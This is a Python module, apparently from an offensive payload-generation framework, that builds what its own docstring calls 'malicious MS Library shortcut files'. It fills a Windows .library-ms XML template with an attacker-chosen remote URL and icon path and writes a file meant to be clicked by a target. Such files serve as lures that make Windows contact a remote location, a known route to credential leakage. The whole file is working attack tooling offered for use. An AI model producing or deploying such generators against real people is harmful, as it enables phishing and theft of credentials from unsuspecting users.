#!/usr/bin/env python
# encoding: utf-8

import logging
from modules.mp_generator import Generator
from collections import OrderedDict


LIBRARY_MS_TEMPLATE = \
r"""<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <name>@shell32.dll,-34575</name>
  <version>20</version>
  <isLibraryPinned>false</isLibraryPinned>
  <iconReference><<<ICON>>></iconReference>
  <templateInfo>
    <folderType>{5C4F28B5-F869-4E84-8E60-F11DB97C5CC7}</folderType>
  </templateInfo>
  <searchConnectorDescriptionList>
    <searchConnectorDescription publisher="Microsoft" product="Windows">
      <description>test1</description>
      <isDefaultSaveLocation>true</isDefaultSaveLocation>
      <isSupported>false</isSupported>
      <simpleLocation>
        <url><<<TARGET>>></url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>

"""

class LibraryShortcutGenerator(Generator):
    """ Module used to generate malicious MS Library shortcut files"""
    
    def check(self):
        return True
        
    
    def generate(self):
                
        logging.info(" [+] Generating %s file..." % self.outputFileType)        
        paramDict = OrderedDict([("Target_Url",None),("Icon_Path",None)])      
        self.fillInputParams(paramDict)
        
        # Fill template
        content = LIBRARY_MS_TEMPLATE
        content = content.replace("<<<TARGET>>>", paramDict["Target_Url"])
        content = content.replace("<<<ICON>>>", paramDict["Icon_Path"])
             
        # Write in new SCF file
        f = open(self.outputFilePath, 'w')
        f.writelines(content)
        f.close()
        
        logging.info("   [-] Generated MS Library Shortcut file: %s" % self.outputFilePath)
        logging.info("   [-] Test with : \n Click on %s file to test.\n" % self.outputFilePath)


        